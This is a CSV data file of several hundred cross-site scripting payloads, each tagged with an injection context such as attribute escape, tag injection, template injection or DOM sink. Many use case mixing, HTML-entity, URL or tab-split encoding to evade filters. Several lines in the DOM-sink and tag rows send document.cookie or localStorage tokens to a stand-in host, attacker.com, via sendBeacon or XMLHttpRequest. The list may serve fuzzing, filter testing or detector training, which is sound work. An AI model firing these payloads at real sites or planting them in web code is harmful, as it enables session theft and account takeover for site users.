payload,context
""" ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(1) """,attribute_escape
<seT oNfoCus=prOmpT(dOcuMenT.dOmaIn)/>,tag_injection
<body src=x onclose=console.log('XSS')>,tag_injection
%3Cplaintext	ontouchstart=alert(1)%3E,tag_injection
&quOt; onBefOreTogGle=coNsoLe.Log('XSS') x=&qUot;,attribute_escape
`><img src=x ontouchstart=confirm(%27XSS%27)>,attribute_escape
""" ><svg onblur=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape
%3C!--%3E%3Ctable oncopy=confirm('XSS')%3E,tag_injection
%22><img src=x onvolumechange=confirm(%27XSS%27)>,attribute_escape
"'><img src=x ontouchst&#97;rt=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
{{$On.ConStrUctOr('prOmpT(1)')()}},template_injection
onpoint&#101;rup=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler
"<source onvolumechange=confirm(String.fromCharCode(88,83,83))/>",tag_injection
{{ ProMpt(1) }},template_injection
<!--><td on&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"' ><svG oNdbLclIck=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"'><img src=x onkeypress=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"\' OnpRomPtdIsmIss=prOmpT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
<!--><svg onbeforecopy=prompt(document.domain)>,tag_injection
"__proto__[""ontouch&#101;nd""]=consol&#101;.log(1)",dom_sink
"eval(""alert(1)"")",dom_sink
"""><script onpointerrawupdate=console.log(document.domain)>",tag_injection
<xss	ontoggle=console.log(%27XSS%27)>,tag_injection
{{confirm|constructor:document.domain}},template_injection
%22 oncanplay=prompt(document.domain) %22,attribute_escape
""" ontransitionstart=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
' oNtoGglE=pRomPt(1) ',attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=f&#101;tch(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>""",dom_sink
\%22 onfocusin=prompt(1)//,attribute_escape
' ><svG oNinPut=alErt(1)>,attribute_escape
"document.write(""<img src=x onerror=\u0061lert(navigator.sendBeacon('//attacker.com',document.cookie))>"")",dom_sink
\%22 onpromptdismiss=prompt(1)//,attribute_escape
"__pRotO__[""oNbeForEcuT""]=coNsoLe.Log(1)",dom_sink
${{\u0061lert(1)}},template_injection
' ><svG oNseArcH=pRomPt(DocUmeNt.DomAin)>,attribute_escape
""" ><svG oNenD=cOnsOle.loG('XSS')>",attribute_escape
' ><svg oninput=&#97;l&#101;rt(1)>,attribute_escape
"__proto__[""oncopy""]=fetch(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink
"%3Cvideo
onclick=console.log('XSS')%3E",tag_injection
"Object.assign(window,{%22onkeypress%22:XMLHttpRequest})",dom_sink
\' onk&#101;ypr&#101;ss=confirm('XSS')//,attribute_escape
`%3E%3Cimg src=x ongestureend=console.log('XSS')%3E,attribute_escape
""" onfocus=&#97;l&#101;rt(1) &#97;utofocus=""",attribute_escape
"' on&#101;nd&#101;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
' onpopstate=confirm(document.domain) ',attribute_escape
<diV	oNpaUse=coNfiRm(LocAtiOn.HasH)>,tag_injection
%27 ongotpointercapture=alert(document.domain) %27,attribute_escape
\%22 onauxclick=confirm(location.hash)//,attribute_escape
<obj&#101;ct src=x onw&#101;bkit&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"<select
onpointermove=prompt(%27XSS%27)>",tag_injection
&#106;&#97;v&#97;script:confirm(docum&#101;nt.dom&#97;in),js_uri
"&#106;&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
OnpAgeRevEal=coNfiRm&#40;doCumEnt.doMaiN&#41;,event_handler
"Object.assign(window,{%22ongestureend%22:alert})",dom_sink
{{cOnfIrm 1}},template_injection
`%3E%3Cimg src=x onhashchange=alert('XSS')%3E,attribute_escape
<td	onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
"""><script>confirm(docum&#101;nt.dom&#97;in)</script>",script_injection
<!--><form onw&#101;bkittr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
""" ><svG oNpoIntErrAwuPdaTe=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
""" ondrop=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
' %3E%3Csvg ongestureend=console.log(location.hash)%3E,attribute_escape
<button x=y onclick=console.log(1)>,tag_injection
"""><Img srC=x onAniMatIonIteRatIon=coNsoLe.Log('XSS')>",attribute_escape
<noScrIpt onGesTurEstArt=alErt('XSS') oNgeStuResTarT=aLerT('XSS')>,tag_injection
OnsCroLleNd=ConFirM/***/(1),event_handler
<&#97;r&#101;&#97; x=y onp&#97;g&#101;show=prompt('XSS')>,tag_injection
j&#97;vascript:alert(document.domain),js_uri
"setInterval(""confirm(localStorage.getItem('token'))"",100)",dom_sink
onfocusin=\u0061lert(1),event_handler
\%22 onpaste=confirm(%27XSS%27)//,attribute_escape
<mtExt/onMouSedOwn=coNsoLe.Log(1)>,tag_injection
"__pRotO__[""oNmoUseWheEl""]=aLerT('XSS')",dom_sink
' ><svG oNfoCusIn=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape
' ><svg oninvalid=confirm(1)>,attribute_escape
<template	ondragenter=\u0061lert('XSS')>,tag_injection
"__pRotO__[""oNtrAnsItiOneNd""]=XMLHTtpReqUesT(dOcuMenT.dOmaIn)",dom_sink
"ObjEct.asSigN(wIndOw,{""oNmoUseWheEl"":alErt})",dom_sink
%3Cmtext onended=confirm(document.domain) onended=confirm(document.domain)%3E,tag_injection
' ><svG oNdrAgeNteR=cOnfIrm('XSS')>,attribute_escape
""" ><svg ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",attribute_escape
onclick=javascr	ipt:confirm(1),event_handler
"""><mtext onfocusout=confirm(location.hash)>",tag_injection
`><img src=x onpromptaction=console.log('XSS')>,attribute_escape
"' ><svg ontouchstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"%3Cscript%3Ewindow['console.log'](String.fromCharCode(88,83,83))%3C/script%3E",script_injection
%3Cmeta src=x onpointerover=confirm(1)%3E,tag_injection
{{constructor.constructor('prompt(document.cookie)')()}},template_injection
"""%3E%3Cbase oninput=alert('XSS')%3E",tag_injection
<script onpointerrawupdate=console.log(document.domain)>,tag_injection
<t&#97;bl&#101;	oncopy=confirm('XSS')>,tag_injection
"%3Cscript
onclick=prompt('XSS')%3E",tag_injection
""" oNfoCusIn=ProMpt(1) """,attribute_escape
"""><noscript ongesturestart=alert('XSS')>",tag_injection
""" %3E%3Csvg onpromptdismiss=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
"__proto__[""oninv&#97;lid""]=&#97;l&#101;rt(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink
<!--><img onp&#97;g&#101;sw&#97;p=consol&#101;.log(1)>,tag_injection
"__pRotO__[""oNweBkiTtrAnsItiOneNd""]=aLerT(1)",dom_sink
"element.setAttribute(%22onclick%22,%22alert(location.hash)%22)",dom_sink
\%22 onbegin=confirm(1)//,attribute_escape
"__proto__[%22onanimationiteration%22]=console.log(String.fromCharCode(88,83,83))",dom_sink
<scr	ipt>/*/prompt(document.domain)</scr	ipt>,script_injection
%3Ctemplate onsearch=console.log(document.domain) onsearch=console.log(document.domain)%3E,tag_injection
"%27 onrepeat=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
"&quot; ondblclick=\u0061lert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
"(new Function(""eval(1)""))();",dom_sink
\' onpopstate=\u0061lert(1)//,attribute_escape
{{[].pop.constructor('alert(document.domain)')()}},template_injection
<link/onwaiting=confirm(1)>,tag_injection
'><img src=x onpl&#97;y=confirm(1)>,attribute_escape
JavA	sCriPt:AleRt(1),js_uri
&quot; onpagehide=alert(location.hash) x=&quot;,attribute_escape
OncAnpLay=coNfiRm/*x*/(1),event_handler
"""><ForM oNpaGehIde=coNfiRm(1)>",tag_injection
%3Cnoscript onpaste=confirm(location.hash)/%3E,tag_injection
j&#97;vascr	ipt:alert(1),js_uri
' oNfoCusOut=coNfiRm(LocAtiOn.HasH) ',attribute_escape
"Object.assign(window,{""ondragenter"":prompt})",dom_sink
<&#97; onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
""" on&#97;uxclick=consol&#101;.log(1) """,attribute_escape
"\' onhashchange=confirm(String.fromCharCode(88,83,83))//",attribute_escape
j&#97;v&#97;script:void(confirm(loc&#97;tion.h&#97;sh)),js_uri
""" ><svg onpromptdismiss=&#97;l&#101;rt('XSS')>",attribute_escape
"<scr	ipt>window['prompt'](String.fromCharCode(88,83,83))</scr	ipt>",script_injection
${\u0061lert?new()('document.cookie')},template_injection
"<s&#101;t
onfocus=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
`><Img srC=x onWaiTinG=cOnfIrm(doCumEnt.doMaiN)>,attribute_escape
'><img src=x onwh&#101;&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
	onTouChmOve=coNfiRm(LocAtiOn.HasH),event_handler
%22 onmouseover=alert(location.hash) x=%22,attribute_escape
"\%27 onended=confirm(String.fromCharCode(88,83,83))//",attribute_escape
javascript:void(confirm(location.hash)),js_uri
	onpageshow=confirm(1),event_handler
"OnaNimAtiOncAncEl=ConFirM&#40;StrIng.frOmCHarCodE(88,83,83)&#41;",event_handler
&quOt; onPoiNteRraWupDatE=pRomPt('XSS') x=&quOt;,attribute_escape
"<listing
onwebkitanimationend=console.log(%27XSS%27)>",tag_injection
""" ><svg ontransitionstart=confirm(document.domain)>",attribute_escape
<script>//confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
"setTimeout(""fetch(document.domain)"",0)",dom_sink
' ><svg on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
<template x=y onsearch=console.log(document.domain)>,tag_injection
%3Ciframe	onsecuritypolicyviolation=confirm('XSS')%3E,tag_injection
"""><img src=x onh&#97;shch&#97;ng&#101;=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape
&quOt; onFocUsoUt=AleRt(LocAtiOn.HasH) X=&QuoT;,attribute_escape
<meta onsecuritypolicyviolation=prompt('XSS') onsecuritypolicyviolation=prompt('XSS')>,tag_injection
ons&#101;&#97;rch=consol&#101;.log('XSS'),event_handler
`><img src=x ons&#101;&#97;rch=confirm(1)>,attribute_escape
OnpOinTerUp=AleRt(DocUmeNt.DomAin),event_handler
"__proto__[""onfocusout""]=prompt(document.cookie+'&loc='+location.href)",dom_sink
onpoint&#101;rup=prompt&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
\' onhashchange=confirm(document.domain)//,attribute_escape
%3Caudio onpopstate=confirm(location.hash)/%3E,tag_injection
%22 ><svg onpagehide=confirm(1)>,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onr&#101;p&#101;&#97;t"":&#97;l&#101;rt})",dom_sink
" onvolumechange=alert(String.fromCharCode(88,83,83))",event_handler
{{{prompt(1)}}},template_injection
"`><img src=x onpointerover=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"document.write(""%3Cimg src=x onerror=XMLHttpRequest(document.cookie+'&loc='+location.href)%3E"")",dom_sink
"<base
onkeydown=\u0061lert('XSS')>",tag_injection
' onlo&#97;d=&#97;l&#101;rt(1) ',attribute_escape
\' OntOucHmoVe=ConFirM(dOcuMenT.dOmaIn)//,attribute_escape
"s&#101;tTim&#101;out(""&#101;v&#97;l(1)"",0)",dom_sink
{{alert %27XSS%27}},template_injection
"""><img src=x onhashchange=console.log(document.domain)>",attribute_escape
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=prompt(btoa(document.cookie))%3E"")",dom_sink
"onpagereveal=alert(String.fromCharCode(88,83,83))",event_handler
' onplaying=alert(location.hash) ',attribute_escape
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=eval(navigator.sendBeacon('//attacker.com',document.cookie))%3E"")",dom_sink
"\"" OneRroR=cOnsOle.loG(lOcaTioN.hAsh)//",attribute_escape
%3C!--%3E%3Ctable onselect=confirm(document.domain)%3E,tag_injection
	onmozfullscreenchange=console.log(document.domain),event_handler
"""><p onb&#101;for&#101;toggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"SetTimEouT(""AleRt(LocAlSTorAge.geTItEm('toKen'))"",0)",dom_sink
"%22 ><svg ontransitionrun=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"%22><img src=x oncopy=alert(String.fromCharCode(88,83,83))>",attribute_escape
{alert document.domain},template_injection
""" ondr&#97;g&#101;nt&#101;r=confirm('XSS') """,attribute_escape
"<form
onr&#101;s&#101;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
<audio onscrollend=prompt(location.hash) onscrollend=prompt(location.hash)>,tag_injection
{{[].pOp.ConStrUctOr('prOmpT('XSS')')()}},template_injection
ondragenter=javascr	ipt:console.log(document.domain),event_handler
"SetIntErvAl(""XMLHtTpREquEst(btOa(DocUmeNt.CooKie))"",100)",dom_sink
"' ><svG oNdbLclIck=alErt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"\"" onselect=confirm(location.hash)//",attribute_escape
%27 onload=console.log(1) %27,attribute_escape
${alert('XSS')},template_injection
"LocAtiOn=""jaVasCriPt:EvaL(lOcaTioN.hAsh)""",dom_sink
<boDy	OniNvaLid=alErt(loCatIon.haSh)>,tag_injection
<template onended=prompt('XSS')>,tag_injection
""" onscrollsnapchange=\u0061lert('XSS') """,attribute_escape
"__pRotO__[""oNweBkiTtrAnsItiOneNd""]=XMLHTtpReqUesT(STriNg.FroMChArCOde(88,83,83))",dom_sink
<video onmozfullscreenchange=prompt(%27XSS%27)>,tag_injection
<noscript onpaste=confirm(location.hash)/>,tag_injection
"<&#101;mb&#101;d
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
"__proto__[""onwebkitfullscreenchange""]=prompt(document.cookie+'&loc='+location.href)",dom_sink
%3Ctitle onmozfullscreenchange=prompt('XSS')/%3E,tag_injection
"on&#97;uxclick=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
<seT oNweBkiTfuLlsCreEncHanGe=ConSolE.lOg('XSS')/>,tag_injection
"onbeforetoggle=confirm(String.fromCharCode(88,83,83))",event_handler
"""><img src=x ontransitionend=alert(1)>",attribute_escape
`><img src=x onscrollsnapchange=alert('XSS')>,attribute_escape
<animatetransform/oncontextmenu=prompt(document.domain)>,tag_injection
"ontransitionstart=prompt&#40;String.fromCharCode(88,83,83)&#41;",event_handler
' ><svg onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(1)>,attribute_escape
'><script>prompt(location.hash)</script>,script_injection
<pl&#97;int&#101;xt/onr&#101;p&#101;&#97;t=prompt('XSS')>,tag_injection
"__pRotO__[""oNpoIntEroVer""]=ConFirM(dOcuMenT.dOmaIn)",dom_sink
""" %3E%3Csvg onsearch=alert('XSS')%3E",attribute_escape
"""%3E%3Cdialog onstalled=confirm('XSS')%3E",tag_injection
`><Img srC=x onPagEhiDe=ProMpt('XSS')>,attribute_escape
OnrEseT=cOnfIrm&#40;'XSS'&#41;,event_handler
"onmozfullscreenchange=javascript:prompt(String.fromCharCode(88,83,83))",event_handler
"__pRotO__[""oNpoIntErcAncEl""]=pRomPt('//AttAckEr.Com/?c='+DocUmeNt.CooKie)",dom_sink
"%22 onpointerrawupdate=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
%27 onpagehide=alert(document.domain) %27,attribute_escape
'%3E%3Cimg src=x onanimationcancel=prompt(location.hash)%3E,attribute_escape
""" ><svg onpointerdown=console.log(String.fromCharCode(88,83,83))>",attribute_escape
<liStiNg	OntRanSitIonStaRt=ConFirM(dOcuMenT.dOmaIn)>,tag_injection
(new Function(%22alert(document.cookie+%27&loc=%27+location.href)%22))();,dom_sink
<svg x=y onpromptdismiss=\u0061lert(location.hash)>,tag_injection
"Object.assign(window,{""onblur"":XMLHttpRequest})",dom_sink
#s&#101;t($x='&#97;l&#101;rt(1)')$x,template_injection
' onwebkitfullscreenchange=alert('XSS') ',attribute_escape
'><Img srC=x onKeyDowN=pRomPt('XSS')>,attribute_escape
' %3E%3Csvg onanimationiteration=prompt(1)%3E,attribute_escape
<%= prOmpT(1) %>,template_injection
{{constructor.constructor(%27prompt(document.cookie)%27)()}},template_injection
<scRipT	>ProMpt(doCumEnt.doMaiN)</scRipT>,script_injection
 onTraNsiTioNstArt=coNsoLe.Log('XSS'),event_handler
${confirm?new()(%27document.domain%27)},template_injection
' ><svg onended=\u0061lert('XSS')>,attribute_escape
"\"" onclick=confirm('XSS')//",attribute_escape
<plaintext onrepeat=prompt(%27XSS%27)/>,tag_injection
'><img src=x onanimationend=confirm(location.hash)>,attribute_escape
"'><Img srC=x onErrOr=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
JavAscRipT:aLerT(1),js_uri
%3Cmarquee src=x onscrollsnapchange=prompt(1)%3E,tag_injection
`><img src=x onp&#97;g&#101;r&#101;v&#101;&#97;l=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
""" onfocus=prompt(document.domain) autofocus=""",attribute_escape
%3Cform onsearch=console.log(1)%3E,tag_injection
<animate src=x onpageshow=console.log(%27XSS%27)>,tag_injection
"&#101;v&#97;l(""f&#101;tch(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"")",dom_sink
' on&#101;nd&#101;d=consol&#101;.log(1) ',attribute_escape
<meta ondrop=alert(document.domain)>,tag_injection
""" %3E%3Csvg oncanplay=prompt(document.domain)%3E",attribute_escape
onanimationiteration=prompt/***/(document.domain),event_handler
`><Img srC=x onTouChmOve=prOmpT(1)>,attribute_escape
<seT oNenD=aLerT(1) oNenD=aLerT(1)>,tag_injection
\%27 onbeforematch=alert(%27XSS%27)//,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNprOmpTacTioN"":FetCh})",dom_sink
window[%22prompt%22](btoa(document.cookie)),dom_sink
OnwAitIng=coNfiRm/*x*/(dOcuMenT.dOmaIn),event_handler
""" %3E%3Csvg oncanplay=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
%27><img src=x ontouchmove=console.log(%27XSS%27)>,attribute_escape
%27 ><svg onblur=alert(document.domain)>,attribute_escape
""" ><svg onbegin=confirm(1)>",attribute_escape
&quOt; onAuxCliCk=ConSolE.lOg(1) X=&QuoT;,attribute_escape
"\"" onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//",attribute_escape
"<&#97;udio
onpl&#97;y=consol&#101;.log(1)>",tag_injection
"\"" onselect=confirm(String.fromCharCode(88,83,83))//",attribute_escape
%22 ><svg onmouseenter=alert(document.domain)>,attribute_escape
"%3Cscript%3Econsole.log`String.fromCharCode(88,83,83)`%3C/script%3E",script_injection
<!--><title onmozfullscreenchange=prompt(%27XSS%27)>,tag_injection
""" oNbeForEcuT=cOnsOle.loG(1) """,attribute_escape
"<plAinTexT	oNpaUse=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"<animate
onpageshow=console.log(%27XSS%27)>",tag_injection
%3Cnoscript src=x onbeforematch=console.log('XSS')%3E,tag_injection
 onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"OncOntExtMenU=pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler
OndRop=coNsoLe.Log&#40;dOcuMenT.dOmaIn&#41;,event_handler
<seLecT/oNseCurItyPolIcyVioLatIon=coNfiRm(LocAtiOn.HasH)>,tag_injection
<body src=x onpoint&#101;rmov&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
	onMouSedOwn=coNsoLe.Log('XSS'),event_handler
"__proto__[""onpopst&#97;t&#101;""]=f&#101;tch(loc&#97;tion.h&#97;sh)",dom_sink
onpoint&#101;rr&#97;wupd&#97;t&#101;=j&#97;v&#97;script:&#97;l&#101;rt('XSS'),event_handler
<obJecT sRc=X oNweBkiTanImaTioNenD=aLerT(lOcaTioN.hAsh)>,tag_injection
"(n&#101;w Function(""XMLHttpR&#101;qu&#101;st('XSS')""))();",dom_sink
<mtext	onfocusout=confirm(location.hash)>,tag_injection
"onvolumechange=\u0061lert/*x*/(String.fromCharCode(88,83,83))",event_handler
&quot; onp&#97;g&#101;show=consol&#101;.log(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
"\"" OnbEfoRepAstE=aLerT('XSS')//",attribute_escape
onend=javascr	ipt:prompt(location.hash),event_handler
\%22 onscrollsnapchange=console.log(location.hash)//,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNpoIntErmOve"":eVal})",dom_sink
"Object.assign(window,{%22onpopstate%22:eval})",dom_sink
{{constructor['constructor']('&#97;l&#101;rt(docum&#101;nt.dom&#97;in)')()}},template_injection
"setInterval(%22confirm(%27XSS%27)%22,100)",dom_sink
' onpointerrawupdate=prompt('XSS') ',attribute_escape
"<meta
onsecuritypolicyviolation=prompt('XSS')>",tag_injection
\' onpointermove=prompt(location.hash)//,attribute_escape
%22 onpointerover=console.log(%27XSS%27) %22,attribute_escape
"'><Img srC=x onCloSe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
`><Img srC=x onGesTurEenD=cOnfIrm(loCatIon.haSh)>,attribute_escape
<im&#97;g&#101; on&#101;nd=prompt(1)>,tag_injection
<scRipT>cOnfIrm(loCatIon.haSh)</sCriPt>,script_injection
' oncanplay=confirm(location.hash) ',attribute_escape
"ObjEct.asSigN(wIndOw,{""oNtoUchStaRt"":prOmpT})",dom_sink
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=eval(location.hash)>%22)",dom_sink
'><img src=x onmousedown=console.log('XSS')>,attribute_escape
"""><scr	ipt>alert('XSS')</scr	ipt>",script_injection
<seLecT/oNprOmpTdiSmiSs=ConSolE.lOg(1)>,tag_injection
"<script	>prompt(String.fromCharCode(88,83,83))</script>",script_injection
%3Ctable onselect=prompt(1)/%3E,tag_injection
<marquee src=x onscrollsnapchange=prompt(1)>,tag_injection
' onpointermove=prompt(location.hash) ',attribute_escape
"'><img src=x oncut=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"""%3E%3Csvg onpromptdismiss=alert(location.hash)%3E",tag_injection
"""><img src=x ondblclick=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
\' onpopstate=prompt(1)//,attribute_escape
<titl&#101; onclick=confirm('XSS')>,tag_injection
onfocusout=alert/***/('XSS'),event_handler
	onpoint&#101;rup=prompt(loc&#97;tion.h&#97;sh),event_handler
<base onpageswap=alert(%27XSS%27)>,tag_injection
"onpageshow=prompt&#40;String.fromCharCode(88,83,83)&#41;",event_handler
JAVASCRIPT:&#97;l&#101;rt('XSS'),js_uri
"%27><img src=x onended=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"'%3E%3Cscript%3Econfirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"LocAtiOn.HreF=""JavAscRipT:eVal(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)""",dom_sink
__proto__[%22onchange%22]=console.log(btoa(document.cookie)),dom_sink
&#106;avascr	ipt:confirm(1),js_uri
"""><img src=x onmousewheel=prompt(document.domain)>",attribute_escape
\' ondr&#97;gov&#101;r=prompt(1)//,attribute_escape
"__proto__[""onmouseover""]=alert(document.cookie+'&loc='+location.href)",dom_sink
"__proto__[%22oncut%22]=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
"<scr	ipt
>confirm(location.hash)</scr	ipt>",script_injection
%3Canimatetransform/onpointerdown=prompt(1)%3E,tag_injection
"' oNgoTpoIntErcAptUre=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
<!--><img onwebkitfullscreenchange=alert(%27XSS%27)>,tag_injection
' ><svg oncopy=confirm('XSS')>,attribute_escape
&quot; onpointerover=console.log(%27XSS%27) x=&quot;,attribute_escape
"<set
onend=alert(1)>",tag_injection
<listing x=y onwebkitanimationend=console.log(%27XSS%27)>,tag_injection
"%22 onfocus=console.log(String.fromCharCode(88,83,83)) autofocus=%22",attribute_escape
""" %3E%3Csvg onvolumechange=confirm('XSS')%3E",attribute_escape
<spAn Src=x OncOpy=prOmpT(lOcaTioN.hAsh)>,tag_injection
"document.querySelector(""body"").innerHTML+=""console.log(btoa(document.cookie))""",dom_sink
"\"" OntOucHstArt=prOmpT(dOcuMenT.dOmaIn)//",attribute_escape
<mtExt onEndEd=ConFirM(dOcuMenT.dOmaIn) onEndEd=ConFirM(dOcuMenT.dOmaIn)>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""ondblclick"":&#97;l&#101;rt})",dom_sink
"%27><img src=x onchange=confirm(String.fromCharCode(88,83,83))>",attribute_escape
' onpause=confirm('XSS') ',attribute_escape
\%27 onclose=alert(document.domain)//,attribute_escape
"onfullscreenchange=javascript:\u0061lert(String.fromCharCode(88,83,83))",event_handler
{{$on.constructor('confirm(1)')()}},template_injection
&quOt; onKeyPreSs=AleRt(1) X=&QuoT;,attribute_escape
""" ><svG oNweBkiTfuLlsCreEncHanGe=ProMpt('XSS')>",attribute_escape
`><img src=x onp&#97;g&#101;show=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape
%27 ><svg ongotpointercapture=confirm(location.hash)>,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNpaUse"":cOnfIrm})",dom_sink
'><img src=x onchange=console.log(1)>,attribute_escape
{{prompt|constructor:docum&#101;nt.dom&#97;in}},template_injection
' ><svG oNbeGin=coNfiRm(1)>,attribute_escape
<template onended=prompt('XSS')/>,tag_injection
`><img src=x ondrop=confirm(1)>,attribute_escape
"""><script>\u0061lert(1)</script>",script_injection
"document.write(""%3Cimg src=x onerror=fetch(String.fromCharCode(88,83,83))%3E"")",dom_sink
\%22 onwebkitanimationend=confirm(%27XSS%27)//,attribute_escape
%3Cplaintext src=x onrepeat=prompt('XSS')%3E,tag_injection
 ontr&#97;nsitionst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"SetTimEouT(""ConFirM(bToa(doCumEnt.coOkiE))"",0)",dom_sink
{php}prompt(%27XSS%27){/php},template_injection
window[%22XMLHttpRequest%22](%27//attacker.com/?c=%27+document.cookie),dom_sink
"<form
onpagehide=confirm(1)>",tag_injection
""" onmousedown=console.log('XSS') """,attribute_escape
"%3Cscript
%3Eprompt('XSS')%3C/script%3E",script_injection
onb&#101;for&#101;copy=&#97;l&#101;rt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler
j&#97;v&#97;script:prompt(1),js_uri
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""XMLHttpR&#101;qu&#101;st(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink
`%3E%3Cimg src=x ontouchmove=confirm(document.domain)%3E,attribute_escape
